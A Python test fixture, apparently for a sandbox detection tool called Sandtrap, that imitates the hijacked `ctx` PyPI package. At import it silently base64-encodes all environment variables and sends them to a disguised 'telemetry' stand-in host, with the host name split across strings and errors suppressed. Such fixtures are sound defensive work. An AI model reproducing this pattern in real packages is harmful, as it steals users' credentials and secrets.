# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only the fake canary environment
# Modelled on the behaviour reported for the hijacked `ctx` PyPI package: collect ALL environment variables, base64-encode them
# and send them to a web app the attacker controls. Fires unconditionally at import; the fake host only exists inside the lab.
import base64
import json
import os
import urllib.parse
import urllib.request


def _sync():
    blob = base64.b64encode(json.dumps(dict(os.environ)).encode()).decode()
    url = "http://telemetry-sync-" + "service.example/api/v1/ping?d=" + urllib.parse.quote(blob)
    try:
        urllib.request.urlopen(url, timeout=3).read()
    except Exception:
        pass


_sync()
